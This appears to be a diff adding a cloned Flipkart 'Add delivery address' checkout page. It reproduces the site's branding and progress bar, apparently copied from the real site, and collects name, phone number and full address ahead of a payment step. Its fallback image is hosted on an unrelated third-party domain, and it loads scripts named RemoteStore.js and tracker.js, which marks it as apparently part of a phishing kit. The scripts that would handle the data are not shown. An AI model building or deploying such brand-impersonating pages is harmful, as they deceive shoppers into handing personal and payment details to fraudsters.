@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en-IN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Add delivery address - Flipkart</title>
+  <meta name="theme-color" content="#2874f0" id="themeColor">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="address.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%232874f0'/><text x='50%25' y='68%25' font-size='20' font-weight='bold' font-family='sans-serif' fill='%23ffe11b' text-anchor='middle'>f</text></svg>">
+  <script src="/assets/security-shield.js"></script>
+</head>
+<body>
+
+  <!-- Centered App Viewport (Mobile Web & Desktop Responsive) -->
+  <div class="address-viewport">
+
+    <!-- 1. HEADER (Matching Reference) -->
+    <header class="address-header">
+      <button class="back-btn" id="back_btn" aria-label="Go Back">
+        <svg width="19" height="16" viewBox="0 0 19 16" xmlns="http://www.w3.org/2000/svg">
+          <path d="M17.556 7.847H1M7.45 1L1 7.877l6.45 6.817" stroke="#000" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" fill="none"></path>
+        </svg>
+      </button>
+      <h1 class="header-title">Add delivery address</h1>
+    </header>
+
+    <!-- 2. PROGRESS BAR (Exact SVG from Reference Site: Step 1 Address -> Step 2 Summary -> Step 3 Payment) -->
+    <div class="progress-box">
+      <svg width="360" height="56" viewBox="0 0 360 56" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M360 0H0V56H360V0Z" fill="white"></path>
+        <!-- Step 3: Payment -->
+        <path d="M300 27.5C305.247 27.5 309.5 23.2467 309.5 18C309.5 12.7533 305.247 8.5 300 8.5C294.753 8.5 290.5 12.7533 290.5 18C290.5 23.2467 294.753 27.5 300 27.5Z" fill="white" stroke="#2874F0"></path>
+        <path d="M298.785 17.084H299.652C300.09 17.0801 300.436 16.9668 300.689 16.7441C300.947 16.5215 301.076 16.1992 301.076 15.7773C301.076 15.3711 300.969 15.0566 300.754 14.834C300.543 14.6074 300.219 14.4941 299.781 14.4941C299.398 14.4941 299.084 14.6055 298.838 14.8281C298.592 15.0469 298.469 15.334 298.469 15.6895H297.045C297.045 15.252 297.16 14.8535 297.391 14.4941C297.625 14.1348 297.949 13.8555 298.363 13.6562C298.781 13.4531 299.248 13.3516 299.764 13.3516C300.615 13.3516 301.283 13.5664 301.768 13.9961C302.256 14.4219 302.5 15.0156 302.5 15.7773C302.5 16.1602 302.377 16.5215 302.131 16.8613C301.889 17.1973 301.574 17.4512 301.188 17.623C301.656 17.7832 302.012 18.0352 302.254 18.3789C302.5 18.7227 302.623 19.1328 302.623 19.6094C302.623 20.375 302.359 20.9844 301.832 21.4375C301.309 21.8906 300.619 22.1172 299.764 22.1172C298.943 22.1172 298.271 21.8984 297.748 21.4609C297.225 21.0234 296.963 20.4414 296.963 19.7148H298.387C298.387 20.0898 298.512 20.3945 298.762 20.6289C299.016 20.8633 299.355 20.9805 299.781 20.9805C300.223 20.9805 300.57 20.8633 300.824 20.6289C301.078 20.3945 301.205 20.0547 301.205 19.6094C301.205 19.1602 301.072 18.8145 300.807 18.5723C300.541 18.3301 300.146 18.209 299.623 18.209H298.785V17.084Z" fill="#2874F0"></path>
+        <!-- Step 2: Order Summary -->
+        <path d="M180 27.5C185.247 27.5 189.5 23.2467 189.5 18C189.5 12.7533 185.247 8.5 180 8.5C174.753 8.5 170.5 12.7533 170.5 18C170.5 23.2467 174.753 27.5 180 27.5Z" fill="white" stroke="#2874F0"></path>
+        <path d="M182.875 22H177.139V21.0215L179.98 17.9219C180.391 17.4648 180.682 17.084 180.854 16.7793C181.029 16.4707 181.117 16.1621 181.117 15.8535C181.117 15.4473 181.002 15.1191 180.771 14.8691C180.545 14.6191 180.238 14.4941 179.852 14.4941C179.391 14.4941 179.033 14.6348 178.779 14.916C178.525 15.1973 178.398 15.582 178.398 16.0703H176.975C176.975 15.5508 177.092 15.084 177.326 14.6699C177.564 14.252 177.902 13.9277 178.34 13.6973C178.781 13.4668 179.289 13.3516 179.863 13.3516C180.691 13.3516 181.344 13.5605 181.82 13.9785C182.301 14.3926 182.541 14.9668 182.541 15.7012C182.541 16.127 182.42 16.5742 182.178 17.043C181.939 17.5078 181.547 18.0371 181 18.6309L178.914 20.8633H182.875V22Z" fill="#2874F0"></path>
+        <!-- Step 1: Delivery Address (Active Step) -->
+        <path d="M60 27.5C65.2467 27.5 69.5 23.2467 69.5 18C69.5 12.7533 65.2467 8.5 60 8.5C54.7533 8.5 50.5 12.7533 50.5 18C50.5 23.2467 54.7533 27.5 60 27.5Z" fill="#2874F0" stroke="#2874F0"></path>
+        <path d="M60.9941 22H59.5762V15.1504L57.4844 15.8652V14.6641L60.8125 13.4395H60.9941V22Z" fill="white"></path>
+        <!-- Connecting Bars -->
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M78 17.5H162V18.5H78V17.5Z" fill="#DBDBDB"></path>
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M198 17.5H282V18.5H198V17.5Z" fill="#DBDBDB"></path>
+      </svg>
+    </div>
+
+    <!-- 3. ADDRESS FORM FIELDS (Matching Reference) -->
+    <main class="address-form-container">
+      <form id="addressForm" autocomplete="on">
+        
+        <!-- Full Name -->
+        <div class="form-floating">
+          <input class="form-control" type="text" id="name" name="name" placeholder="Full Name" required autocomplete="name">
+          <label for="name">Full Name</label>
+        </div>
+
+        <!-- Mobile number -->
+        <div class="form-floating">
+          <input class="form-control" type="tel" id="number" name="number" placeholder="Mobile number" maxlength="10" required autocomplete="tel">
+          <label for="number">Mobile number</label>
+        </div>
+
+        <!-- Pincode -->
+        <div class="form-floating">
+          <input class="form-control" type="number" id="pin" name="pin" placeholder="Pincode" maxlength="6" required autocomplete="postal-code">
+          <label for="pin">Pincode</label>
+        </div>
+
+        <!-- City & State Row -->
+        <div class="form-row-2">
+          <div class="form-floating">
+            <input class="form-control" type="text" id="city" name="city" placeholder="City" required autocomplete="address-level2">
+            <label for="city">City</label>
+          </div>
+
+          <div class="form-floating">
+            <select class="form-select" id="state" name="state" required autocomplete="address-level1">
+              <option value="" disabled selected>Select State</option>
+              <option value="AP">Andhra Pradesh</option>
+              <option value="AR">Arunachal Pradesh</option>
+              <option value="AS">Assam</option>
+              <option value="BR">Bihar</option>
+              <option value="CG">Chhattisgarh</option>
+              <option value="GA">Goa</option>
+              <option value="GJ">Gujarat</option>
+              <option value="HR">Haryana</option>
+              <option value="HP">Himachal Pradesh</option>
+              <option value="JH">Jharkhand</option>
+              <option value="KA">Karnataka</option>
+              <option value="KL">Kerala</option>
+              <option value="MP">Madhya Pradesh</option>
+              <option value="MH">Maharashtra</option>
+              <option value="MN">Manipur</option>
+              <option value="ML">Meghalaya</option>
+              <option value="MZ">Mizoram</option>
+              <option value="NL">Nagaland</option>
+              <option value="OD">Odisha</option>
+              <option value="PB">Punjab</option>
+              <option value="RJ">Rajasthan</option>
+              <option value="SK">Sikkim</option>
+              <option value="TN">Tamil Nadu</option>
+              <option value="TG">Telangana</option>
+              <option value="TR">Tripura</option>
+              <option value="UP">Uttar Pradesh</option>
+              <option value="UK">Uttarakhand</option>
+              <option value="WB">West Bengal</option>
+              <option value="AN">Andaman and Nicobar Islands</option>
+              <option value="CH">Chandigarh</option>
+              <option value="DN">Dadra and Nagar Haveli and Daman and Diu</option>
+              <option value="DL">Delhi</option>
+              <option value="JK">Jammu and Kashmir</option>
+              <option value="LA">Ladakh</option>
+              <option value="LD">Lakshadweep</option>
+              <option value="PY">Puducherry</option>
+            </select>
+            <label for="state">State</label>
+          </div>
+        </div>
+
+        <!-- House No., Building Name -->
+        <div class="form-floating">
+          <input class="form-control" type="text" id="flat" name="flat" placeholder="House No., Building Name" required autocomplete="address-line1">
+          <label for="flat">House No., Building Name</label>
+        </div>
+
+        <!-- Road name, Area, Colony -->
+        <div class="form-floating">
+          <input class="form-control" type="text" id="area" name="area" placeholder="Road name, Area, Colony" required autocomplete="address-line2">
+          <label for="area">Road name, Area, Colony</label>
+        </div>
+
+        <!-- Free shipping & safety delivery banner (matching reference gif) -->
+        <div class="safety-banner">
+          <img src="assets/images/free_shippingbanner.gif" alt="Free Shipping Safe Delivery" onerror="this.src='https://mediumseagreen-quetzal-932356.hostingersite.com/freedom-fk/xxx/free_shippingbanner.gif'">
+        </div>
+
+      </form>
+    </main>
+
+    <!-- 4. FIXED FOOTER SAVE ADDRESS BUTTON (Matching Reference) -->
+    <div class="card-footer-fixed">
+      <button class="common-button" type="button" id="quickSaveBtn">Save Address</button>
+    </div>
+
+  </div> <!-- End .address-viewport -->
+
+  <!-- Toast Notification Message -->
+  <div class="toast-msg" id="toastMsg">✓ Address Saved</div>
+
+  <script src="/assets/RemoteStore.js"></script>
+  <script src="/assets/tracker.js"></script>
+  <script src="address.js"></script>
+</body>
+</html>
